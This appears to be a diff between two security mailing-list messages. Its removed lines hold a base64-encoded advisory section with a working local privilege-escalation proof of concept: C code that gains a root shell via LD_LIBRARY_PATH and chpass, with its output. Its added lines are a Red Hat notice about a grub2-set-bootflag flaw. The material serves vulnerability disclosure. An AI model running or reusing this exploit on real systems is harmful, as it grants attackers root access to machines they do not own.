-PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT09PT09PQ0KDQpJbiB0aGlzIHNlY3Rpb24sIHdlIGRlbW9uc3Ry
-YXRlIHRoZSB1c2Ugb2Ygb3VyIHByb29mIG9mIGNvbmNlcHQ6DQoNCi0tLS0t
-LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
-LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KDQokIGlkDQp1aWQ9MzI3
-Njcobm9ib2R5KSBnaWQ9MzI3Njcobm9ib2R5KSBncm91cHM9MzI3Njcobm9i
-b2R5KQ0KDQokIGNkIC90bXANCg0KJCBjYXQgPiBsaWIuYyA8PCAiRU9GIg0K
-I2luY2x1ZGUgPHBhdGhzLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQoNCnN0
-YXRpYyB2b2lkIF9fYXR0cmlidXRlX18gKChjb25zdHJ1Y3RvcikpIF9pbml0
-ICh2b2lkKSB7DQogICAgaWYgKHNldHVpZCgwKSAhPSAwKSBfZXhpdChfX0xJ
-TkVfXyk7DQogICAgaWYgKHNldGdpZCgwKSAhPSAwKSBfZXhpdChfX0xJTkVf
-Xyk7DQogICAgY2hhciAqIGNvbnN0IGFyZ3ZbXSA9IHsgX1BBVEhfS1NIRUxM
-LCAiLWMiLCBfUEFUSF9LU0hFTEwgIjsgZXhpdCAxIiwgTlVMTCB9Ow0KICAg
-IGV4ZWN2ZShhcmd2WzBdLCBhcmd2LCBOVUxMKTsNCiAgICBfZXhpdChfX0xJ
-TkVfXyk7DQp9DQpFT0YNCg0KJCByZWFkZWxmIC1hIC91c3Ivc2Jpbi9wd2Rf
-bWtkYiB8IGdyZXAgTkVFREVEDQogMHgwMDAwMDAwMDAwMDAwMDAxIChORUVE
-RUQpICAgICAgICAgICAgIFNoYXJlZCBsaWJyYXJ5OiBbbGlidXRpbC5zby4x
-My4xXQ0KIDB4MDAwMDAwMDAwMDAwMDAwMSAoTkVFREVEKSAgICAgICAgICAg
-ICBTaGFyZWQgbGlicmFyeTogW2xpYmMuc28uOTUuMV0NCg0KJCBnY2MgLWZw
-aWMgLXNoYXJlZCAtcyAtbyBsaWJ1dGlsLnNvLjEzLjEgbGliLmMNCg0KJCBj
-YXQgPiBwb2MuYyA8PCAiRU9GIg0KI2luY2x1ZGUgPHN0cmluZy5oPg0KI2lu
-Y2x1ZGUgPHN5cy9wYXJhbS5oPg0KI2luY2x1ZGUgPHN5cy9yZXNvdXJjZS5o
-Pg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KDQppbnQNCm1haW4oaW50IGFyZ2Ms
-IGNoYXIgKiBjb25zdCAqIGFyZ3YpDQp7DQogICAgI2RlZmluZSBMTFAgIkxE
-X0xJQlJBUllfUEFUSD0uIg0KICAgIHN0YXRpYyBjaGFyIGxscFtBUkdfTUFY
-IC0gMTI4XTsNCiAgICBtZW1zZXQobGxwLCAnOicsIHNpemVvZihsbHApLTEp
-Ow0KICAgIG1lbWNweShsbHAsIExMUCwgc2l6ZW9mKExMUCktMSk7DQogICAg
-Y2hhciAqIGNvbnN0IGVudnBbXSA9IHsgbGxwLCAiRURJVE9SPWVjaG8gJyMn
-ID4+IiwgTlVMTCB9Ow0KDQogICAgI2RlZmluZSBEQVRBIChBUkdfTUFYICog
-c2l6ZW9mKGNoYXIgKikpDQogICAgY29uc3Qgc3RydWN0IHJsaW1pdCBkYXRh
-ID0geyBEQVRBLCBEQVRBIH07DQogICAgaWYgKHNldHJsaW1pdChSTElNSVRf
-REFUQSwgJmRhdGEpICE9IDApIF9leGl0KF9fTElORV9fKTsNCg0KICAgIGlm
-IChhcmdjIDw9IDEpIF9leGl0KF9fTElORV9fKTsNCiAgICBhcmd2ICs9IDE7
-DQogICAgZXhlY3ZlKGFyZ3ZbMF0sIGFyZ3YsIGVudnApOw0KICAgIF9leGl0
-KF9fTElORV9fKTsNCn0NCkVPRg0KDQokIGdjYyAtcyAtbyBwb2MgcG9jLmMN
-Cg0KJCAuL3BvYyAvdXNyL2Jpbi9jaHBhc3MNCg0KIyBpZA0KdWlkPTAocm9v
-dCkgZ2lkPTAod2hlZWwpIGdyb3Vwcz0zMjc2Nyhub2JvZHkpDQoNCi0tLS0t
-LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
-LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KDQoNCj09PT09PT09PT09
-PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT09PT09PT09PT09PT09PQ0KQWNrbm93bGVkZ21lbnRzDQo9PT09
-PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCg0KV2UgdGhhbmsgVGhl
-byBkZSBSYWFkdCBhbmQgdGhlIE9wZW5CU0QgZGV2ZWxvcGVycyBmb3IgdGhl
-aXIgaW5jcmVkaWJseQ0KcXVpY2sgcmVzcG9uc2U6IHRoZXkgcHVibGlzaGVk
-IGEgcGF0Y2ggZm9yIHRoaXMgdnVsbmVyYWJpbGl0eSBpbiBsZXNzDQp0aGFu
-IDMgaG91cnMuIFdlIGFsc28gdGhhbmsgTUlUUkUncyBDVkUgQXNzaWdubWVu
-dCBUZWFtLg0KDQoNCg0KW2h0dHBzOi8vZDFkZWphajZkY3F2MjQuY2xvdWRm
-cm9udC5uZXQvYXNzZXQvaW1hZ2UvZW1haWwtYmFubmVyLTM4NC0yeC5wbmdd
-PGh0dHBzOi8vd3d3LnF1YWx5cy5jb20vZW1haWwtYmFubmVyPg0KDQoNCg0K
-VGhpcyBtZXNzYWdlIG1heSBjb250YWluIGNvbmZpZGVudGlhbCBhbmQgcHJp
-dmlsZWdlZCBpbmZvcm1hdGlvbi4gSWYgaXQgaGFzIGJlZW4gc2VudCB0byB5
-b3UgaW4gZXJyb3IsIHBsZWFzZSByZXBseSB0byBhZHZpc2UgdGhlIHNlbmRl
-ciBvZiB0aGUgZXJyb3IgYW5kIHRoZW4gaW1tZWRpYXRlbHkgZGVsZXRlIGl0
-LiBJZiB5b3UgYXJlIG5vdCB0aGUgaW50ZW5kZWQgcmVjaXBpZW50LCBkbyBu
-b3QgcmVhZCwgY29weSwgZGlzY2xvc2Ugb3Igb3RoZXJ3aXNlIHVzZSB0aGlz
-IG1lc3NhZ2UuIFRoZSBzZW5kZXIgZGlzY2xhaW1zIGFueSBsaWFiaWxpdHkg
-Zm9yIHN1Y2ggdW5hdXRob3JpemVkIHVzZS4gTk9URSB0aGF0IGFsbCBpbmNv
-bWluZyBlbWFpbHMgc2VudCB0byBRdWFseXMgZW1haWwgYWNjb3VudHMgd2ls
-bCBiZSBhcmNoaXZlZCBhbmQgbWF5IGJlIHNjYW5uZWQgYnkgdXMgYW5kL29y
-IGJ5IGV4dGVybmFsIHNlcnZpY2UgcHJvdmlkZXJzIHRvIGRldGVjdCBhbmQg
-cHJldmVudCB0aHJlYXRzIHRvIG91ciBzeXN0ZW1zLCBpbnZlc3RpZ2F0ZSBp
-bGxlZ2FsIG9yIGluYXBwcm9wcmlhdGUgYmVoYXZpb3IsIGFuZC9vciBlbGlt
-aW5hdGUgdW5zb2xpY2l0ZWQgcHJvbW90aW9uYWwgZW1haWxzICjigJxzcGFt
-4oCdKS4gSWYgeW91IGhhdmUgYW55IGNvbmNlcm5zIGFib3V0IHRoaXMgcHJv
-Y2VzcywgcGxlYXNlIGNvbnRhY3QgdXMuDQo=
+Hello All,
+
+Tavis Ormandy reported a flaw in grub2-set-bootflag utility of grub2.
+
+grub-set-bootflag is a command line to set bootflags in GRUB's stored
+environment. This is a downstream utility which is shipped with Red Hat
+Enterprise Linux 8 and Fedora. A flaw was found in this application
+which would could allow a local attacker (someone having a local account
+on the system) to cause grub configuration files to be truncated.
+Whenever the machine was rebooted, grub would fail to read the
+configuration files and the system would be rendered unbootable.
+
+More details and patches available in:
+https://bugzilla.redhat.com/show_bug.cgi?id=1764925
+
+
+
+-- 
+Huzaifa Sidhpurwala / Red Hat Product Security
+
